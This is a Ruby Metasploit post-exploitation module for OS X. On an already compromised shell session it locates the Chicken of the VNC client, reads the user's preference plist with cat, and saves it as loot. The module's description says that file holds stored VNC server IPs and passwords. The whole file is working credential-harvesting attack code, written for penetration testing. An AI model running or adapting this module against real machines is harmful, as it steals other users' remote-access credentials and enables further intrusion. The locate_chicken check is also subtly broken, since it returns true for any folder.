##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/common'
require 'msf/core/post/file'

class Metasploit3 < Msf::Post

	include Msf::Post::Common
	include Msf::Post::File

	def initialize(info={})
		super(update_info(info,
			'Name'          => 'OSX Gather Chicken of the VNC Profile',
			'Description'   => %q{
				This module will download the "Chicken of the VNC" client application's
				profile file,	which is used to store other VNC servers' information such
				as as the	IP and password.
			},
			'License'       => MSF_LICENSE,
			'Author'        => [ 'sinn3r'],
			'Platform'      => [ 'osx' ],
			'SessionTypes'  => [ "shell" ]
		))

	end

	def whoami
		exec("/usr/bin/whoami")
	end

	#
	# This is just a wrapper for cmd_exec(), except it chomp() the output,
	# and retry under certain conditions.
	#
	def exec(cmd)
		begin
			out = cmd_exec(cmd).chomp
		rescue ::Timeout::Error => e
			vprint_error("#{@peer} - #{e.message} - retrying...")
			retry
		rescue EOFError => e
			vprint_error("#{@peer} - #{e.message} - retrying...")
			retry
		end
	end

	def dir(path)
		subdirs = exec("ls -l #{path}")
		return [] if subdirs =~ /No such file or directory/
		items = subdirs.scan(/[A-Z][a-z][a-z]\x20+\d+\x20[\d\:]+\x20(.+)$/).flatten
		return items
	end

	def locate_chicken
		dir("/Applications/").each do |folder|
			m = folder.match(/Chicken of the VNC\.app/)
			return true
		end

		return false
	end

	def get_profile_plist(user)
		f = exec("cat /Users/#{user}/Library/Preferences/com.geekspiff.chickenofthevnc.plist")
		if f =~ /No such file or directory/
			return nil
		else
			return f
		end
	end

	def save(file)
		p = store_loot(
			"chickenvnc.profile",
			"bin",
			session,
			file,
			"com.geekspiff.chickenofthevnc.plist"
		)

		print_good("#{@peer} - plist saved in #{p}")
	end

	def run
		@peer = "#{session.session_host}:#{session.session_port}"
		user = whoami

		if not locate_chicken
			print_error("#{@peer} - Chicken of the VNC is not installed")
			return
		else
			print_status("#{@peer} - Chicken of the VNC found")
		end

		plist = get_profile_plist(user)
		if plist.nil?
			print_error("No profile plist found")
		else
			save(plist) if not plist.nil?
		end
	end

end
